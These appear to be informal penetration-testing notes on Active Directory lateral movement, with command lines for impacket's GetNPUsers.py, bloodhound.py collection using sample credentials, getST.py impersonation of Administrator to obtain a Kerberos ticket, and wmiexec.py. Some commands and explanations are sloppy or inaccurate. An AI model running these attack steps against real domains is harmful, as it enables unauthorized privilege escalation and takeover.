#TOOLS FOR LATERAL MOVEMENT
  1) bloodhound
     bloodhound helps in escalating to admin priviledges .first we will use scripts form impacket GetNPUsers.py to get lateral enumeration and member groups that may exist
     ie $python3 GetNPUsers.py <domain>/<user> this helps in getting things like users activities and TGT at times when a failed authentication occurs  , you know what to do next incase you
        find kerberos tgt 
      - bloodhound.py
          this tool is used to get the necessary files that you can upoad to the bloodhound gui 
           saying supposed you find out the user is eugene and the password 'somethingnice' we can leverahe this tool like 
            ie $ python3 bloodhound.py -d <domain> -u eugene -p somethingnice -ns <ip> -c all  
             ths generates multiple json files you can use by uploading them on bloodhound graphical user interface
              
       we can then use getST.py to get the admin ccache file which we can later export into our system 
       to use the script you can use python to run the file 
         $ python3 getST.py -spn cifs/domain -dc-ip <domain-controler ip> -impersonate Administrator  domain/user:password_for_the_user 
       after getting the krb5ccname file you can export it into your system with the following command 
             $ export KRB5CCNAME <the_ccache_file>

    2)wmiexec.py 
      this tool is used to escalate privileges to the root
